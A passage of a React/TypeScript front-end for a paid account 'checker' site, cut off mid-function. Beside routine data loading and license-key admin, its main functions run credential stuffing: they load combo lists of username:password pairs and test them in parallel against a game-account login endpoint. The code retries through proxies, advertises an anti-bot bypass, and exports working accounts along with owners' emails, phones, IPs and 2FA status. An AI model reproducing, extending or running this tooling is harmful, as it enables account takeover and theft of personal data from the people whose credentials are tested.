            console.error("Auth sync error:", err);
          }
        }
      }
    });
    return () => subscription?.unsubscribe();
  }, []);

  const [logCategories, setLogCategories] = useState<any[]>([]);

  const fetchRequestId = useRef(0);
  const fetchAbortController = useRef<AbortController | null>(null);

  const fetchAllData = useCallback(async () => {
    try {
      if (fetchAbortController.current) {
        fetchAbortController.current.abort();
      }
      const controller = new AbortController();
      fetchAbortController.current = controller;

      fetchRequestId.current += 1;
      const currentRequestId = fetchRequestId.current;
      
      console.log("Fetching public data from backend...", { reqId: currentRequestId });
      console.time(`fetchAllData-${currentRequestId}`);

      const publicAxios = axios.create();
      publicAxios.interceptors.request.use(config => {
        if (config.headers) {
          if ('common' in config.headers && typeof config.headers.common === 'object' && config.headers.common !== null) {
             delete (config.headers.common as any)["Authorization"];
          }
          if ('Authorization' in config.headers) {
             delete config.headers["Authorization"];
          }
        }
        return config;
      });

      const fetchApi = async (url: string) => {
        try {
          const res = await axios.get(url, { signal: controller.signal });
          
          if (currentRequestId !== fetchRequestId.current) {
            console.log(`Aborting stale response for ${url}`);
            return { data: null, error: 'stale' };
          }
          
          return { data: res.data, error: null };
        } catch (e: any) {
          if (axios.isCancel(e)) return { data: null, error: 'canceled' };
          if (currentRequestId !== fetchRequestId.current) return { data: null, error: 'stale' };
          const status = e.response?.status;
          const errorMsg = e.response?.data?.error || e.message;
          if (status !== 401 && status !== 403 && status !== 404) {
             console.error(`Fetch ERROR for ${url}:`, errorMsg);
          }
          return { data: null, error: errorMsg };
        }
      };

      // 1. Critical Landing Page Data - Parallel Fetching with Promise.all (Using Cache-Eligible publicAxios)
      const publicEndpoints = [
        "/api/settings",
        "/api/products",
        "/api/categories",
        "/api/stats",
        "/api/pages"
      ];

      const mainFetchPromise = Promise.all(
        publicEndpoints.map(url =>
          publicAxios.get(url, { signal: controller.signal })
            .then(res => ({ url, data: res.data, isCanceled: false }))
            .catch(err => {
              if (axios.isCancel(err)) {
                return { url, data: null, isCanceled: true };
              }
              console.error(`Parallel fetch error for public endpoint ${url}:`, err);
              return { url, data: null, isCanceled: false };
            })
        )
      ).then(results => {
        if (currentRequestId !== fetchRequestId.current) return;
        
        for (const res of results) {
          if (res.isCanceled) continue;
          
          if (res.url === "/api/settings" && res.data) {
            setSiteSettings(res.data);
            try { localStorage.setItem("apex_settings_cache", JSON.stringify(res.data)); } catch (e) {}
          } else if (res.url === "/api/products" && res.data && Array.isArray(res.data)) {
            const finalProds = res.data;
            setProducts(finalProds);
            try { localStorage.setItem("apex_products_cache", JSON.stringify(finalProds)); } catch (e) {}
          } else if (res.url === "/api/categories" && res.data && Array.isArray(res.data)) {
            const sanitized = sanitizeCategories(res.data);
            setCategories(sanitized);
            try { localStorage.setItem("apex_categories_cache", JSON.stringify(sanitized)); } catch (e) {}
          } else if (res.url === "/api/stats" && res.data) {
            const statsObj = {
              users: res.data.users,
              stock: res.data.stock,
              sales: res.data.sales,
              topups: res.data.totalTopupsAmount,
              totalOrders: res.data.totalOrders,
            };
            setSiteStats(statsObj);
            try { localStorage.setItem("apex_stats_cache", JSON.stringify(statsObj)); } catch (e) {}
          } else if (res.url === "/api/pages" && res.data) {
            const d = res.data;
            const pagesToSet = Array.isArray(d) ? d : (d.data && Array.isArray(d.data) ? d.data : []);
            setCustomPages(pagesToSet);
            try { localStorage.setItem("apex_pages_cache", JSON.stringify(pagesToSet)); } catch (e) {}
          }
        }
      });

      // 2. Secondary Data & User Data
      const logsPromise = fetchApi("/api/logs-system").then(res => {
        if (res.data && Array.isArray(res.data.categories)) {
          setLogCategories(res.data.categories.filter((c: any) => c.isVisible));
        }
      });

      // Health check for DB readiness
      const healthPromise = axios
        .get("/api/health")
        .then(() => {
          setIsDBReady(true);
          setDbErrorDetail(null);
        })
        .catch((e) => {
          setIsDBReady(false);
          let errorMsg =
            e.response?.data?.error || e.message || "Unknown Error";
          setDbErrorDetail(`Backend API ไม่ตอบสนอง (Offline): ${errorMsg}`);
        });

      // Await only the critical home view endpoints + backend health check to reveal the home UI instantly
      await Promise.all([mainFetchPromise, healthPromise]);
      console.timeEnd(`fetchAllData-${currentRequestId}`);
    } catch (err: any) {
      console.error("Critical fetch error in fetchAllData:", err);
    }
  }, []);

  // Dedicated user-session data retriever (decoupled from the landing page loop)
  const fetchUserData = useCallback(async () => {
    if (!user) return;
    try {
      console.log("Fetching user-specific data from backend...");
      const [usedKeysRes, purchasesRes, topupsRes] = await Promise.all([
        axios.get("/api/used_keys").catch(() => null),
        axios.get("/api/purchases?limit=20").catch(() => null),
        axios.get("/api/topups").catch(() => null)
      ]);
      if (usedKeysRes?.data) setUsedKeysHistory(usedKeysRes.data);
      if (purchasesRes?.data) {
        const purchaseData = Array.isArray(purchasesRes.data) 
          ? purchasesRes.data 
          : purchasesRes.data.data;
        if (Array.isArray(purchaseData)) {
          setPurchaseHistory(purchaseData);
          if (purchasesRes.data.nextCursor) {
            setPurchasesNextCursor(purchasesRes.data.nextCursor);
          }
        }
      }
      if (topupsRes?.data && Array.isArray(topupsRes.data)) setTopupHistory(topupsRes.data);
    } catch (err) {
      console.error("Failed to fetch user-specific data:", err);
    }
  }, [user]);

  // Dedicated admin logs/entities data retriever (decoupled from the landing page loop)
  const fetchAdminData = useCallback(async () => {
    if (!isAdmin || isAdminDataLoading) return;
    setIsAdminDataLoading(true);
    try {
      console.log("Fetching admin-specific data from backend...");
      const [licensesRes, blockedIpsRes, usersRes] = await Promise.all([
        axios.get("/api/license_keys").catch(() => null),
        axios.get("/api/blocked_ips").catch(() => null),
        axios.get("/api/users").catch(() => null)
      ]);
      if (licensesRes?.data) setLicenseKeys(licensesRes.data);
      if (blockedIpsRes?.data) setBlockedIPs(blockedIpsRes.data);
      if (usersRes?.data && Array.isArray(usersRes.data)) setUsersList(usersRes.data);
    } catch (err) {
      console.error("Failed to fetch admin-specific data:", err);
    } finally {
      setIsAdminDataLoading(false);
    }
  }, [isAdmin, isAdminDataLoading]);

  // Combined system-wide data refresh function for user/admin actions
  const refreshAllSystemData = useCallback(async () => {
    console.log("Executing manual refresh of all relevant system data...");
    await Promise.all([
      fetchAllData(),
      user ? fetchUserData() : Promise.resolve(),
      isAdmin ? fetchAdminData() : Promise.resolve()
    ]);
  }, [fetchAllData, fetchUserData, fetchAdminData, user, isAdmin]);

  // Backend API Listeners - Public static endpoints refreshed every 60 seconds
  useEffect(() => {
    fetchAllData();
    const timer = setInterval(fetchAllData, 60000);
    return () => {
      clearInterval(timer);
      if (fetchAbortController.current) {
        fetchAbortController.current.abort();
      }
    };
  }, [fetchAllData]);

  // Trigger user private data load on session changes
  useEffect(() => {
    if (user) {
      fetchUserData();
    } else {
      setUsedKeysHistory([]);
      setPurchaseHistory([]);
      setTopupHistory([]);
    }
  }, [user, fetchUserData]);

  // Trigger admin private data load on status changes
  useEffect(() => {
    if (isAdmin) {
      fetchAdminData();
    } else {
      setLicenseKeys([]);
      setBlockedIPs([]);
      setUsersList([]);
    }
  }, [isAdmin, fetchAdminData]);

  // App Init & check IP
  useEffect(() => {
    let dataReady = false;

    const initApp = async () => {
      // Load local storage data using a static key, independent of IP so VPN works
      const savedLogs = localStorage.getItem(`checker_logs_main`);
      const savedUserPlan = localStorage.getItem(`checker_userplan_main`);
      const savedDailyUsage = localStorage.getItem(`checker_usage_main`);
      const savedLastDate = localStorage.getItem(`checker_lastdate_main`);

      // Clear any legacy unsafe sensitive data
      localStorage.removeItem(`checker_combo_main`);
      localStorage.removeItem(`checker_valid_main`);
      localStorage.removeItem(`checker_invalid_main`);
      localStorage.removeItem(`checker_total_main`);

      const todayDate = new Date().toISOString().slice(0, 10);
      if (savedLastDate === todayDate) {
        setDailyUsage(Number(savedDailyUsage) || 0);
      } else {
        setDailyUsage(0);
      }
      setLastUsageDate(todayDate);

      if (savedUserPlan) setUserPlan(JSON.parse(savedUserPlan));

      // Removed loading combo and valid accounts from local storage to prevent XSS leakage
      // Combo data must be loaded server side or kept entirely in memory

      if (savedLogs && JSON.parse(savedLogs).length > 0) {
        setLogs(JSON.parse(savedLogs));
      } else {
        console.log("Welcome to APEXSTORE System");
        setLogs([
          {
            id: Math.random().toString(36).substring(2, 9),
            time: new Date().toLocaleTimeString("th-TH"),
            text: "System Ready - Backend connected.",
            iconName: "check",
            colorClass: "text-green-500",
          },
        ]);
      }

      // Fast check if cache resources exist to bypass loading screen delays
      const hasCachedStats = !!localStorage.getItem("apex_stats_cache");
      const hasCachedProducts = !!localStorage.getItem("apex_products_cache");
      const hasCachedCategories = !!localStorage.getItem("apex_categories_cache");
      const isCacheAvailable = hasCachedStats && hasCachedProducts && hasCachedCategories;

      if (isCacheAvailable) {
        // Cached data is present; reveal immediately
        setIsLoaded(true);
      }

      let timeoutId: any = setTimeout(() => {
        console.warn("Loading timeout 8s exceeded. Force revealing portal.");
        setForceReveal(true);
        setIsLoaded(true);
      }, 8000);

       // Concurrent parallel boot loading of metadata, pages, settings, stats, and client configuration
       try {
         await Promise.all([
           axios.get("/api/health")
             .then(res => {
               const ip = res.data.clientIp || "Unknown";
               setClientIp(ip);
             })
             .catch(err => {
               setClientIp("offline_local");
               console.error("IP Check Failed", err);
             }),
           fetchAllData()
         ]);
       } catch (err) {
         console.error("Initial system parallel data fetch failed:", err);
       } finally {
         clearTimeout(timeoutId);
         setIsLoaded(true);
       }
       
       dataReady = true;
       setIsLoaded(true);
     };
     initApp();
   }, [fetchAllData]);

  // Sync combo to ref for high-speed access
  useEffect(() => {
    comboRef.current = combo;
  }, [combo]);

  useEffect(() => {
    if (running) {
      setStartTime(performance.now());
    } else {
      setStartTime(null);
    }
  }, [running]);

  // Save Data locally (independent of IP for VPN compatibility)
  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_logs_main`, JSON.stringify(logs.slice(-100))); // Keep last 100
  }, [logs, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_usage_main`, dailyUsage.toString());
  }, [dailyUsage, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_lastdate_main`, lastUsageDate);
  }, [lastUsageDate, isLoaded, clientIp]);

  // No superficial security - focus on data integrity instead
  useEffect(() => {
    // F12 blocks are easily bypassed, removed for better developer experience
  }, []);

  // Auto-scroll logs
  useEffect(() => {
    if (logDivRef.current) {
      logDivRef.current.scrollTop = logDivRef.current.scrollHeight;
    }
  }, [logs]);

  const addLog = (
    text: string,
    iconName: string,
    colorClass: string = "text-zinc-300",
  ) => {
    setLogs((prev) => {
      const nextLogs = [
        ...prev,
        {
          id: Math.random().toString(36).substring(2, 9),
          time: new Date().toLocaleTimeString("th-TH"),
          text,
          iconName,
          colorClass,
        },
      ];
      return nextLogs.length > 200
        ? nextLogs.slice(nextLogs.length - 200)
        : nextLogs;
    });
  };

  const delay = (ms: number) =>
    new Promise((resolve) => setTimeout(resolve, ms));

  const redeemKey = async (
    keyInput: string,
    usernameInput: string = "ผู้ใช้งานทั่วไป",
  ) => {
    if (!keyInput) return;
    try {
      Swal.fire({
        title: "กำลังตรวจสอบ...",
        allowOutsideClick: false,
        didOpen: () => {
          Swal.showLoading();
        },
        background: "#09090b",
        color: "#fff",
      });

      const res = await axios.post("/api/redeem", { key: keyInput.trim() });
      const { rank, type } = res.data;

      const newPlan = {
        ...userPlan,
        username: usernameInput,
        isPremium: true,
        rank: rank as any,
      };
      setUserPlan(newPlan as any);

      Swal.fire({
        icon: "success",
        title: "ยินดีด้วย!",
        text: `คุณได้รับสิทธิ์ระดับ Premium เรียบร้อยแล้ว`,
        background: "#09090b",
        color: "#fff",
      });
    } catch (err: any) {
      if (
        err.response &&
        err.response.status === 400 &&
        err.response.data.error === "Key not found or used"
      ) {
        Swal.fire({
          icon: "error",
          title: "ไม่พบกุญแจนี้",
          text: "รหัสที่คุณกรอกอาจจะผิด หรือถูกใช้งานไปแล้ว",
          background: "#09090b",
          color: "#fff",
        });
      } else if (err.response && err.response.status === 404) {
        Swal.fire({
          icon: "error",
          title: "ไม่พบกุญแจนี้",
          text: "รหัสที่คุณกรอกอาจจะผิด หรือถูกใช้งานไปแล้ว",
          background: "#09090b",
          color: "#fff",
        });
      } else {
        handleDbError(err, OperationType.WRITE, "license_keys");
        Swal.fire(
          "Error",
          "การสื่อสารล้มเหลว: " + (err.message || "Unknown error"),
          "error",
        );
      }
    }
  };
  const handleLogoClick = () => {
    setActiveView("login");
  };

  const handleLogout = async () => {
    try {
      await auth.auth.signOut();
    } catch (err) {
      console.error("Logout error:", err);
    }
    localStorage.removeItem("apex_admin");
    delete axios.defaults.headers.common["Authorization"];
    setIsAdmin(false);
    setUserPlan(null);
    setUser(null);
    setPurchaseHistory([]);
    setTopupHistory([]);
    setUsedKeysHistory([]);
    setActiveView("home");
    Swal.fire({
      icon: "info",
      title: "ออกจากระบบแล้ว",
      timer: 1500,
      showConfirmButton: false,
      background: "#09090b",
      color: "#fff",
    });
  };

  const resendVerification = async () => {
    // Disabled as requested
  };

  const addLicenseKey = async () => {
    const { value: formValues } = await Swal.fire({
      title: "สร้างคีย์ใหม่",
      html:
        '<select id="swal-input1" class="swal2-input bg-[#050505] border-[#1e1e1e] text-white w-full">' +
        '<option value="Day">1 วัน (Day)</option>' +
        '<option value="Week">7 วัน (Week)</option>' +
        '<option value="Month">1 เดือน (Month)</option>' +
        '<option value="3Month">3 เดือน (3 Months)</option>' +
        '<option value="Year">1 ปี (Year)</option>' +
        '<option value="Lifetime">ถาวร (Lifetime)</option>' +
        "</select>" +
        '<input id="swal-input2" class="swal2-input bg-[#050505] border-[#1e1e1e] text-white w-full" placeholder="จำนวนคีย์ (1-50)" type="number" value="1">',
      focusConfirm: false,
      background: "#ffffff",
      color: "#18181b",
      preConfirm: () => {
        return [
          (document.getElementById("swal-input1") as HTMLSelectElement).value,
          (document.getElementById("swal-input2") as HTMLInputElement).value,
        ];
      },
    });

    if (formValues) {
      const [type, countStr] = formValues;
      const count = parseInt(countStr) || 1;

      try {
        const newKeys = [];
        for (let i = 0; i < count; i++) {
          const newKey =
            "APEXSTORE-" +
            Math.random().toString(36).substring(2, 10).toUpperCase() +
            "-" +
            Math.random().toString(36).substring(2, 6).toUpperCase();
          newKeys.push({
            key: newKey,
            plan: type,
            status: "active",
            created_at: new Date().toISOString(),
          });
        }
        await axios.post(`/api/license_keys/bulk`, { keys: newKeys });
        Swal.fire("สำเร็จ", `สร้างคีย์ ${count} รายการ สำเร็จ`, "success");
      } catch (err) {
        handleDbError(err, OperationType.WRITE, "license_keys");
        Swal.fire(
          "Error",
          "ไม่สามารถสร้างคีย์ได้: " + (err as Error).message,
          "error",
        );
      }
    }
  };

  const blockIP = async () => {
    const { value: ipData } = await Swal.fire({
      title: "บล็อค IP ผู้ใช้",
      html:
        '<input id="swal-ip" class="swal2-input bg-[#050505] border-[#1e1e1e] text-white w-full" placeholder="IP Address เช่น 1.1.1.1">' +
        '<input id="swal-reason" class="swal2-input bg-[#050505] border-[#1e1e1e] text-white w-full" placeholder="เหตุผลการบล็อค">',
      focusConfirm: false,
      background: "#ffffff",
      color: "#18181b",
      preConfirm: () => {
        return [
          (document.getElementById("swal-ip") as HTMLInputElement).value,
          (document.getElementById("swal-reason") as HTMLInputElement).value,
        ];
      },
    });

    if (ipData) {
      const [ip, reason] = ipData;
      if (!ip) return;
      try {
        await axios.post(`/api/blocked_ips`, {
          ip,
          reason: reason || "Violation of terms",
        });
        Swal.fire("สำเร็จ", `บล็อค IP ${ip} สำเร็จ`, "success");
      } catch (err) {
        handleDbError(err, OperationType.WRITE, "blocked_ips");
        Swal.fire(
          "ข้อผิดพลาด",
          "ไม่สามารถบล็อคได้: " + (err as Error).message,
          "error",
        );
      }
    }
  };

  const deleteKey = async (keyId: string) => {
    const result = await Swal.fire({
      title: "ยืนยันการลบ?",
      text: "คุณกำลังลบคีย์ " + keyId,
      icon: "warning",
      showCancelButton: true,
      confirmButtonColor: "#ef4444",
      cancelButtonColor: "#27272a",
      confirmButtonText: "ลบออก",
      background: "#ffffff",
      color: "#18181b",
    });

    if (result.isConfirmed) {
      try {
        await axios.delete(`/api/license_keys/${keyId}`);
        Swal.fire("ลบแล้ว", "คีย์ถูกลบออกจากระบบแล้ว", "success");
        setLicenseKeys((prev) => prev.filter((k) => k.id !== keyId));
      } catch (err) {
        handleDbError(err, OperationType.DELETE, "license_keys/" + keyId);
        Swal.fire(
          "ข้อผิดพลาด",
          "ลบไม่สำเร็จ: " + (err as Error).message,
          "error",
        );
      }
    }
  };

  const bulkDeleteKeys = async () => {
    const totalActive = licenseKeys.filter((k) => k.status === "active").length;
    const totalUsed = licenseKeys.filter((k) => k.status === "used").length;
    const totalAll = licenseKeys.length;

    const result = await Swal.fire({
      title: "ลบคีย์หลายรายการ",
      html: `
        <div class="text-left text-sm space-y-2 mb-4">
          <div><span class="text-zinc-500">คีย์ทั้งหมด:</span> <span class="font-medium text-[#10b981]">${totalAll}</span> รายการ</div>
          <div><span class="text-zinc-500">ยังไม่ได้ใช้:</span> <span class="font-medium text-[#10b981]">${totalActive}</span> รายการ</div>
          <div><span class="text-zinc-500">ใช้แล้ว:</span> <span class="font-medium text-amber-500">${totalUsed}</span> รายการ</div>
        </div>
        <select id="bulk-delete-type" class="swal2-select" style="width: 100%; font-size: 14px; margin-bottom: 10px;">
          <option value="used">ลบเฉพาะคีย์ที่ใช้แล้ว (Used)</option>
          <option value="active">ลบเฉพาะคีย์ที่ยังไม่ได้ใช้ (Active)</option>
          <option value="all">ลบคีย์ทั้งหมด (All)</option>
        </select>
        <input id="bulk-delete-count" type="number" min="1" class="swal2-input" placeholder="จำนวนที่ต้องการลบ (เว้นว่างเพื่อลบทั้งหมดตามประเภท)" style="width: 100%; font-size: 14px; margin: 0; box-sizing: border-box;">
      `,
      showCancelButton: true,
      confirmButtonText: "ถัดไป",
      cancelButtonText: "ยกเลิก",
      preConfirm: () => {
        const type = (
          document.getElementById("bulk-delete-type") as HTMLSelectElement
        ).value;
        const countStr = (
          document.getElementById("bulk-delete-count") as HTMLInputElement
        ).value;
        const count = countStr ? parseInt(countStr) : null;
        return { type, count };
      },
    });

    if (result.isConfirmed) {
      const { type, count } = result.value;
      let keysToDelete = licenseKeys;
      if (type === "active")
        keysToDelete = keysToDelete.filter((k) => k.status === "active");
      if (type === "used")
        keysToDelete = keysToDelete.filter((k) => k.status === "used");

      if (keysToDelete.length === 0) {
        return Swal.fire("ข้อมูล", "ไม่มีคีย์ในระบบที่ตรงกับเงื่อนไข", "info");
      }

      if (count && count > 0 && count < keysToDelete.length) {
        keysToDelete = keysToDelete.slice(0, count);
      }

      const confirm2 = await Swal.fire({
        title: "ยืนยันขั้นสุดท้าย",
        text: `คุณต้องการลบคีย์จำนวน ${keysToDelete.length} รายการใช่หรือไม่?`,
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#ef4444",
        confirmButtonText: "ยืนยันการลบ",
        cancelButtonText: "ยกเลิก",
      });

      if (confirm2.isConfirmed) {
        Swal.fire({
          title: "กำลังลบ...",
          allowOutsideClick: false,
          didOpen: () => {
            Swal.showLoading();
          },
        });
        try {
          const ids = keysToDelete.map((k) => k.id);
          const res = await axios.post("/api/license_keys/bulk_delete", {
            ids,
          });
          const deletedCount = res.data.deletedCount;
          setLicenseKeys((prev) => prev.filter((k) => !ids.includes(k.id)));
          Swal.fire(
            "ลบแล้ว",
            `ลบคีย์สำเร็จจำนวน ${deletedCount} รายการ`,
            "success",
          );
        } catch (err: any) {
          Swal.fire("ข้อผิดพลาด", "ลบไม่สำเร็จ: " + err.message, "error");
        }
      }
    }
  };

  const unblockIP = async (ip: string) => {
    try {
      await axios.delete(`/api/blocked_ips/${ip}`);
      Swal.fire("สำเร็จ", "ปลดบล็อค IP เรียบร้อย", "success");
      setBlockedIPs((prev) => prev.filter((i) => i.ip !== ip));
    } catch (err) {
      handleDbError(err, OperationType.DELETE, "blocked_ips/" + ip);
      Swal.fire("ข้อผิดพลาด", "ไม่สำเร็จ: " + (err as Error).message, "error");
    }
  };

  const checkSingle = async (
    acc: string,
    pass: string,
    index: number,
    cToken?: string | null,
    pool?: string[],
    originalLine?: string,
  ) => {
    let retries = 2; // Up to 2 retries for proxy errors
    while (retries >= 0 && runningRef.current) {
      try {
        if (retries < 2) {
          // addLog omitted for cleaner UI
        }

        const response = await axios.post(`/api/check`, {
          account: acc,
          password: pass,
          turnstileToken: cToken,
        });
        const result = response.data;

        if (result.success) {
          addLog(
            `[${index + 1}] Auth [OK] -> ${acc}`,
            "key",
            "text-[#10b981] font-medium",
          );
          const newResult: AccountResult = {
            ...result.data,
            cleanAt: new Date().toLocaleDateString("th-TH"),
            skins: result.data.skins || 0,
          };

          setValidAccounts((prev) => [newResult, ...prev]);
          addLog(
            `[${index + 1}] HIT: ${acc}`,
            "check",
            "text-[#10b981] font-medium",
          );
          return;
        } else {
          let errorMsg = result.error || "Check failed";
          if (typeof errorMsg === "object") {
            try {
              errorMsg = JSON.stringify(errorMsg);
            } catch (e) {
              errorMsg = String(errorMsg);
            }
          }

          if (
            result.isProxyError ||
            (typeof errorMsg === "string" && errorMsg.includes("Proxy"))
          ) {
            if (pool && originalLine) {
              pool.push(originalLine); // Put back to queue to retry later
              return;
            }
            if (retries > 0) {
              retries--;
              continue;
            }
          }

          const isRateLimit =
            typeof errorMsg === "string" &&
            (errorMsg.includes("error_too_many_requests") ||
              errorMsg.includes("Too many requests") ||
              errorMsg.includes("(403)"));

          if (!isRateLimit) {
            if (result.isProxyError) {
              if (pool && originalLine) {
                pool.push(originalLine);
                return;
              }
            } else {
              setInvalidCount((prev) => prev + 1);
              addLog(
                `[${index + 1}] FAIL: ${acc} - ${errorMsg}`,
                "x",
                "text-red-500",
              );
            }
          } else {
            addLog(
              `[${index + 1}] WARN: Rate Limit / IP Blocked. Pausing...`,
              "alert-triangle",
              "text-amber-400",
            );
            setRunning(false);
            runningRef.current = false;
          }
          return;
        }
      } catch (err: any) {
        let errMsg = err.response?.data?.error || err.message;
        if (typeof errMsg === "object") {
          try {
            errMsg = JSON.stringify(errMsg);
          } catch (e) {
            errMsg = String(errMsg);
          }
        }

        const isProxy =
          err.response?.data?.isProxyError ||
          (typeof errMsg === "string" && errMsg.includes("Proxy")) ||
          errMsg.includes("timeout") ||
          err.code === "ECONNABORTED";

        if (isProxy) {
          if (pool && originalLine) {
            pool.push(originalLine); // Requeue!
            return;
          }
          if (retries > 0) {
            retries--;
            continue;
          }
        }

        if (isProxy) {
          if (pool && originalLine) {
            pool.push(originalLine); // Requeue!
            return;
          }
        } else {
          setInvalidCount((prev) => prev + 1);
          console.error(`Check failed for ${acc}:`, err);
          addLog(
            `[${index + 1}] ERR: ${acc} - ${errMsg}`,
            "x",
            "text-red-500 font-medium",
          );
        }
        return;
      }
    }
  };

  const startCheck = async () => {
    if (running) return;
    const text = comboRef.current;
    if (!text.trim()) {
      Swal.fire({ title: "ข้อผิดพลาด", text: "ไม่มี Combo", icon: "error" });
      return;
    }

    const lines = text
      .trim()
      .split("\n")
      .map((l) => l.trim())
      .filter((l) => l.includes(":"));
    if (lines.length === 0) {
      Swal.fire({
        title: "ข้อผิดพลาด",
        text: "รูปแบบข้อมูลไม่ถูกต้อง (ต้องมี : )",
        icon: "error",
      });
      return;
    }

    let linesToCheck = lines;
    setSavedLinesToCheck(linesToCheck);

    // Always show Turnstile modal to fetch a real token, even for premium (Turnstile is invisible for good users)
    setPendingTurnstileToken(null);
    setShowTurnstileModal(true);
  };

  const executeCheck = async (
    token: string,
    linesArg: string[] = savedLinesToCheck,
  ) => {
    setRunning(true);
    runningRef.current = true;
    setValidAccounts([]);
    setInvalidCount(0);
    setTotalChecked(0);

    addLog(
      `เริ่มตรวจสอบ... ทั้งหมด ${linesArg.length} รายการ [DataDome Bypass: ACTIVE] Threads: ${threads}`,
      "terminal",
      "text-[#10b981]",
    );

    const pool = [...linesArg];
    let active = 0;

    const worker = async () => {
      while (pool.length > 0 && runningRef.current) {
        const line = pool.shift();
        if (!line) break;
        const index = linesArg.indexOf(line);
        let acc = "";
        let pass = "";
        const firstColon = line.indexOf(":");
        if (firstColon !== -1) {
          const parts = line.split(":");
          if (parts.length >= 3 && parts[1].includes("@")) {
            acc = parts[1];
            const secondColon = line.indexOf(":", firstColon + 1);
            pass = line.substring(secondColon + 1);
          } else {
            acc = parts[0];
            pass = line.substring(firstColon + 1);
          }
        }

        if (acc && pass) {
          active++;
          await checkSingle(acc.trim(), pass.trim(), index, token, pool, line);
          if (!userPlan?.isPremium) {
            setDailyUsage((prev) => prev + 1);
          }
          active--;
        }
      }
    };

    const workers = [];
    for (let i = 0; i < Math.min(threads, linesArg.length); i++) {
      workers.push(worker());
    }

    await Promise.all(workers);

    setRunning(false);
    runningRef.current = false;
    addLog("ตรวจสอบเสร็จสิ้น", "check", "text-green-400 font-medium");
  };

  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!file.name.toLowerCase().endsWith(".txt")) {
      Swal.fire({
        title: "ข้อผิดพลาด",
        text: "รองรับเฉพาะไฟล์ .txt เท่านั้น",
        icon: "error",
      });
      if (fileInputRef.current) fileInputRef.current.value = "";
      return;
    }

    const reader = new FileReader();
    reader.onload = (event) => {
      const text = event.target?.result as string;
      setCombo((prev) => (prev ? prev + "\n" + text : text));
      Swal.fire({
        title: "สำเร็จ",
        text: "นำเข้าข้อมูลจากไฟล์ .txt สำเร็จ",
        icon: "success",
        timer: 1500,
        showConfirmButton: false,
      });
      if (fileInputRef.current) fileInputRef.current.value = "";
    };
    reader.readAsText(file);
  };

  const stopCheck = () => {
    if (!running) return;
    setRunning(false);
    runningRef.current = false;
    addLog("⛔ หยุดตามคำสั่ง", "square", "text-orange-400");
  };

  const clearLog = () => {
    setLogs([]);
  };

  const downloadFile = (name: string, content: string) => {
    const blob = new Blob([content], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportClean = () => {
    const data = validAccounts.filter((a) => a.isClean);
    if (!data.length)
      return Swal.fire({
        title: "ข้อมูล",
        text: "ไม่พบบัญชีปกติ (Clean)",
        icon: "info",
      });
    downloadFile(
      `Clean_Accounts_${new Date().toISOString().slice(0, 10)}.txt`,
      data.map((a) => `${a.account}:${a.password}`).join("\n"),
    );
    Swal.fire({ title: "สำเร็จ", text: "บันทึกไฟล์สำเร็จ", icon: "success" });
  };

  const exportBound = () => {
    const data = validAccounts.filter((a) => !a.isClean);
    if (!data.length)
      return Swal.fire({
        title: "ข้อมูล",
        text: "ไม่พบบัญชีเชื่อมโยง (Bound)",
        icon: "info",
      });
    downloadFile(
      `Bound_Accounts_${new Date().toISOString().slice(0, 10)}.txt`,
      data.map((a) => `${a.account}:${a.password}`).join("\n"),
    );
    Swal.fire({ title: "สำเร็จ", text: "บันทึกไฟล์สำเร็จ", icon: "success" });
  };

  const exportRov = () => {
    const data = validAccounts.filter((a) => a.hasRov);
    if (!data.length)
      return Swal.fire({
        title: "ข้อมูล",
        text: "ไม่พบบัญชี ROV",
        icon: "info",
      });
    downloadFile(
      `ROV_Accounts_${new Date().toISOString().slice(0, 10)}.txt`,
      data
        .map(
          (a) =>
            `${a.account}:${a.password} | Char: ${a.rovCharacter} | ${a.rovClean ? "Clean" : "Bound"}`,
        )
        .join("\n"),
    );
    Swal.fire({ title: "สำเร็จ", text: "บันทึกไฟล์สำเร็จ", icon: "success" });
  };

  const exportAllValid = () => {
    if (!validAccounts.length)
      return Swal.fire({
        title: "คำเตือน",
        text: "ไม่มีข้อมูลบัญชีที่ผ่าน",
        icon: "warning",
      });
    const text = validAccounts
      .map(
        (a) =>
          `[✔] Login Successful\n\n` +
          `[ACCOUNT INFO]\n` +
          `• Username: ${a.account}:${a.password}\n` +
          `• Last Login: ${a.lastLoginDate || "N/A"}\n` +
          `• Location: ${a.lastLoginSource || "Unknown"} (${a.lastLoginCountry || "Unknown"})\n` +
          `• IP Address: ${a.lastLoginIp || "N/A"}\n` +
          `• Login Country: ${a.lastLoginCountry || "N/A"}\n` +
          `• User Country: ${a.region}\n\n` +
          `[ACCOUNT DETAILS]\n` +
          `• Garena Shells: ${a.shells}\n` +
          `• Avatar URL: ${a.avatarUrl && a.avatarUrl !== "N/A" ? a.avatarUrl : "No Avatar"}\n` +
          `• Mobile No: ${a.mobileNumber || "N/A"}\n` +
          `• Email: ${a.emailAddress || "N/A"} (${a.emailVerified ? "Verified" : "Not Verified"})\n` +
          `• Facebook Username: ${a.fbUsername || "N/A"}\n\n` +
          `[GAME INFO]\n` +
          `${a.otherGames.join("\n") || "No game connections found"}\n` +
          (a.codmNickname && a.codmNickname !== "N/A"
            ? `\n[+] CODM Info:\nName: ${a.codmNickname} | Level: ${a.level} | Region: ${a.codmRegion || "N/A"} ${a.codmRegionFlag || ""}\nUID: ${a.codmUid || "N/A"} | OpenID: ${a.codmOpenId || "N/A"}\n`
            : "") +
          `\n[SECURITY STATUS]\n` +
          `• Mobile Bound: ${a.phoneBound ? "Yes" : "No"}\n` +
          `• Email Verified: ${a.emailVerified ? "Verified" : "Not Verified"}\n` +
          `• Facebook Linked: ${a.fbLinked ? "Yes" : "No"}\n` +
          `• Authenticator: ${a.authenticatorEnabled ? "Enabled" : "Disabled"}\n` +
          `• 2FA Enabled: ${a.twoFaEnabled ? "Enabled" : "Disabled"}\n` +
          `• Account Status: ${a.isClean ? "Clean" : "Bound"}\n\n` +
          `---------------------[ NEXT ]---------------------`,
      )
      .join("\n\n");
    downloadFile(
